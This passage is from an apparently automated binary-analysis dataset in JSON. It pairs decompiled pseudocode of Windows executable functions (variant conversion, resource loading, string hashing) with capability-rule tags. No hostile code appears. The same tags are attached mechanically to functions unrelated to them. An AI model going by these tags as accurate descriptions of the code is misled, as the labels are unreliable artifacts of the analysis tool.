&fcn.0040eb40::var_2ch;\n    var_34h = 0x40ec83;\n    fcn.0040d2a8(var_30h);\n    var_34h = 0x40ec8e;\n    fcn.0040d5e4();\n    var_34h = 0x40ec9b;\n    fcn.004054c0();\n    var_34h = 0x40eca9;\n    *0x49581c = fcn.0040d2f4();\n    var_34h = &fcn.0040eb40::var_30h;\n    var_38h = 0x40ecc3;\n    fcn.0040d2a8(var_34h);\n    var_38h = 0x40ecd0;\n    fcn.004054c0();\n    var_38h = &fcn.0040eb40::var_34h;\n    var_3ch = 0x40ece5;\n    fcn.0040d2a8(var_38h);\n    var_3ch = 0x40ecf2;\n    fcn.004054c0();\n    var_3ch = 0x40ecfa;\n    fcn.0040546c();\n    var_3ch = 0x40ed02;\n    fcn.0040546c();\n    var_3ch = &fcn.0040eb40::var_38h;\n    var_40h = 0x40ed17;\n    fcn.0040d2a8(var_3ch);\n    var_40h = 0x40ed21;\n    iVar1 = fcn.00409e90();\n    if (iVar1 == 0) {\n        var_40h = 0x40ed32;\n        fcn.00405504();\n    }\n    else {\n        var_40h = 0x40ed41;\n        fcn.00405504();\n    }\n    var_40h = &fcn.0040eb40::var_3ch;\n    fcn.0040d2a8(var_40h);\n    iVar1 = fcn.00409e90();\n    if (iVar1 == 0) {\n        fcn.0040d2a8(&fcn.0040eb40::var_40h);\n        iVar1 = fcn.00409e90();\n        if (iVar1 == 0) {\n            fcn.00405504();\n        }\n        else {\n            fcn.00405504();\n        }\n    }\n    fcn.00405800(var_ch, 0x40eea4, var_4h, var_8h);\n    fcn.00405800(var_ch, 0x40eeb0, var_4h, var_8h);\n    *0x4958d6 = fcn.0040d2f4();\n    *in_FS_OFFSET = var_ch;\n    fcn.00405490(0x40ee12);\n    return;\n}\n",
        "token_count": 1697
    },
    "0040f068": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f068(void)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    \n    uVar1 = 0;\n    while( true ) {\n        uVar2 = uVar1 << 5 | uVar1 >> 0x1b;\n        uVar3 = *in_EAX;\n        if (uVar3 == 0) break;\n        if (('@' < uVar3) && (uVar3 < '[')) {\n            uVar3 = uVar3 | 0x20;\n        }\n        uVar1 = uVar1 << 5 & 0xffffff00 | uVar2 ^ uVar3;\n        in_EAX = in_EAX + 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 187
    },
    "0040f2b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f2b4(void)\n\n{\n    while( true ) {\n        if (*0x490a18 == NULL) break;\n        *0x490a18 = **0x490a18;\n        fcn.00402f0c();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040f318": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f318(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x49272c == 0) {\n        iVar3 = 0;\n        for (puVar1 = **0x492a14; puVar1 != NULL; puVar1 = *puVar1) {\n            sub.kernel32.dll_FindResourceA(puVar1[1], 0x40f388, 10);\n            iVar3 = sub.kernel32.dll_LoadResource();\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n    }\n    else {\n        uVar2 = sub.kernel32.dll_FindResourceA(**0x49272c, 0x40f388, 10);\n        iVar3 = sub.kernel32.dll_LoadResource(**0x49272c, uVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 203
    },
    "0040f390": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040f390(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0x40f39a;\n    iVar2 = fcn.0040f318(param_1);\n    iVar3 = *0x490a28;\n    if (iVar2 != 0) {\n        iVar3 = fcn.0040f2d8();\n        iVar4 = fcn.0040f2e8();\n        if ((((iVar3 == *0x490a1c) && (iVar4 == *0x490a2c)) || ((iVar3 == *0x490a20 && (iVar4 == *0x490a30)))) ||\n           ((iVar3 == *0x490a24 && (iVar4 == *0x490a34)))) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        sub.kernel32.dll_FreeResource(iVar2, param_1 & 0xffffff00 | uVar1);\n        iVar4 = iVar2;\n        if (iVar2 == '\\0') {\n            fcn.0040f300();\n            iVar4 = iVar2;\n        }\n    }\n    return CONCAT44(iVar4, iVar3);\n}\n",
        "token_count": 296
    },
    "0040f420": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f420(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40f458);\n    if (iVar1 != 0) {\n        *0x490844 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40f468);\n    }\n    if (*0x490844 == NULL) {\n        *0x490844 = fcn.0040a6c0;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0040fa08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040fa08(void)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = **0x492a14; puVar1 != NULL; puVar1 = *puVar1) {\n        if (puVar1[5] != 0) {\n            fcn.0040633c();\n            puVar1[5] = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "00410470": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410470(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    \n    iVar1 = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        iVar1 = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (iVar1 == 0) {\n            iVar1 = in_EDX;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 110
    },
    "00411ce0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411ce0(uint32_t param_1, uint16_t *param_2)\n\n{\n    float10 fVar1;\n    ulong uVar2;\n    \n    if (param_1 != *param_2) {\n        if (*param_2 == 0x400c) {\n            fcn.00411ce0();\n        }\n        else {\n    // switch table (21 cases) at 0x411d25\n            switch(param_1) {\n            case 0:\n                if ((*param_2 == 1) && (*0x490a54 != '\\0')) {\n                    fcn.00410e04();\n                }\n                else {\n                    fcn.004115e8();\n                }\n                break;\n            case 1:\n                fcn.00411350();\n                break;\n            case 2:\n                fcn.00412650();\n                fcn.00415930();\n                break;\n            case 3:\n                fcn.004120a4();\n                fcn.00415890();\n                break;\n            case 4:\n                fVar1 = fcn.004139f8();\n                fcn.0041597c(fVar1);\n                break;\n            case 5:\n                fVar1 = fcn.00413680();\n                fcn.004159a0(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 6:\n                fVar1 = fcn.00414338();\n                fcn.004159cc(ROUND(fVar1), ROUND(fVar1) >> 0x20);\n                break;\n            case 7:\n                fVar1 = fcn.00413dd0();\n                fcn.004159f8(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 8:\n                fcn.00411ac4();\n                break;\n            case 9:\n                fcn.00411b5c();\n                break;\n            default:\n                if (param_1 == 0x100) {\n                    fcn.00411b10();\n                }\n                else if (param_1 == 0x101) {\n                    fcn.00410e04();\n                }\n                else {\n                    fcn.00411c74();\n                }\n                break;\n            case 0xb:\n                fcn.0041316c();\n                fcn.00415a24();\n                break;\n            case 0xd:\n                fcn.00411ba8();\n                break;\n            case 0x10:\n                fcn.004124f4();\n                fcn.00415910();\n                break;\n            case 0x11:\n                fcn.004125a8();\n                fcn.004158b0();\n                break;\n            case 0x12:\n                fcn.00412748();\n                fcn.004158d0();\n                break;\n            case 0x13:\n                fcn.00412824();\n                fcn.004158f0();\n                break;\n            case 0x14:\n                uVar2 = fcn.00412b74();\n                fcn.00415950(uVar2, uVar2 >> 0x20);\n            }\n        }\n        return;\n    }\n    fcn.00411a14();\n    return;\n}\n",
        "token_count": 717
    },
    "004120a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004120a4(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4124c5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4120d7\n    switch(uVar1) {\n    case 0:\n        var_8h = 0;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            puStack28 = &stack0xfffffffc;\n            fcn.00410e04();\n        }\n        var_8h = 0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 5:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 6:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 7:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 8:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411f0c();\n        break;\n    case 9:\n    case 0xd:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411fc0();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411f0c();\n        }\n        else if (uVar1 == 0x101) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411ffc();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack28 = &stack0xfffffffc;\n            cVar2 = fcn.00412060();\n            if (cVar2 == '\\0') {\n                var_8h = fcn.00411fc0();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4122fb\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411fc0();\n                break;\n            case 2:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 3:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 5:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 6:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 7:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 8:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411f0c();\n                break;\n            case 0xb:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.004120a4();\n                break;\n            case 0x10:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x11:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x12:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x13:\n                var_8h = **(in_EAX + 4);\n                if (var_8h < 0) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 0x14:\n                var_8h = **(in_EAX + 4);\n                if (var_8h >> 0x1f != (*(in_EAX + 4))[1]) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404508();\n                }\n            }\n        }\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0xc:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.004120a4();\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        if (var_8h < 0) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n        if (var_8h >> 0x1f != *(in_EAX + 6)) {\n            var_8h = fcn.00404508();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    return var_8h;\n}\n",
        "token_count": 1828
    },
    "004124f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004124f4(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x490a54 != '\\0') {\n            puStack24 = 0x412534;\n            fcn.00410e04();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x10) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x412582;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.004120a4();\n        if (0xff < uVar2 + 0x80) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 318
    },
    "004125a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004125a8(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x490a54 != '\\0') {\n            puStack24 = 0x4125e8;\n            fcn.00410e04();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x11) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x41262d;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.004120a4();\n        if (0xff < uVar2) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 316
    },
    "00412650": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412650(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (18 cases) at 0x412689\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            puStack24 = 0x4126c2;\n            fcn.00410e04();\n        }\n        uVar1 = 0;\n        break;\n    case 2:\n        uVar1 = in_EAX[4];\n        break;\n    default:\n        uStack28 = 0x412725;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.004120a4();\n        if (0xffff < uVar1 + 0x8000) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x10:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 346
    },
    "00412748": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412748(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (19 cases) at 0x41277e\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            puStack24 = 0x4127b0;\n            fcn.00410e04();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x4127fe;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.004120a4();\n        if (0xffff < uVar1) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n    }\n    return uVar1;\n}\n",
        "token_count": 321
    },
    "00412824": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412824(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (20 cases) at 0x41285f\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            puStack24 = 0x412898;\n            fcn.00410e04();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x4128ea;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00412b74();\n        uVar1 = uVar2;\n        if (uVar2 >> 0x20 != 0) {\n            uVar1 = fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 366
    },
    "00412b74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00412b74(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar3 = CONCAT44(var_ch, var_10h);\n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x412f80;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x412ba7\n    switch(uVar1) {\n    case 0:\n        uVar3 = 0;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            puStack36 = &stack0xfffffffc;\n            fcn.00410e04();\n        }\n        uVar3 = 0;\n        break;\n    case 2:\n        uVar3 = in_EAX[4];\n        break;\n    case 3:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        break;\n    case 5:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        break;\n    case 6:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        break;\n    case 7:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403444();\n        break;\n    case 8:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.004129bc();\n        break;\n    case 9:\n    case 0xd:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00412910();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.004129bc();\n        }\n        else if (uVar1 == 0x101) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00412abc();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack36 = &stack0xfffffffc;\n            cVar2 = fcn.00412b28();\n            if (cVar2 == '\\0') {\n                uVar3 = fcn.00412910();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x412dcb\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412910();\n                break;\n            case 2:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 3:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                break;\n            case 5:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                break;\n            case 6:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                break;\n            case 7:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403444();\n                break;\n            case 8:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.004129bc();\n                break;\n            case 0xb:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412b74();\n                break;\n            case 0x10:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                uVar3 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        uVar3 = in_EAX[4];\n        break;\n    case 0xc:\n        uVar3 = fcn.00412b74();\n        break;\n    case 0x10:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar3 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        uVar3 = *(in_EAX + 4);\n    }\n    *in_FS_OFFSET = uStack44;\n    return uVar3;\n}\n",
        "token_count": 1242
    },
    "0041316c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0041316c(uint32_t param_1)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t *in_EAX;\n    bool bVar4;\n    uint32_t uStack8;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x413186\n    switch(uVar1) {\n    case 0:\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 1:\n        if (*0x490a54 != '\\0') {\n            fcn.00410e04();\n        }\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 2:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 3:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 4:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4134bc;\n        break;\n    case 5:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4134bc;\n        break;\n    case 6:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4134bc;\n        break;\n    case 7:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4134bc;\n        break;\n    case 8:\n        uVar2 = fcn.00412fb8();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 9:\n    case 0xd:\n        uVar2 = fcn.0041307c();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            uVar2 = fcn.00412fb8();\n            uStack8 = param_1 & 0xffffff00 | 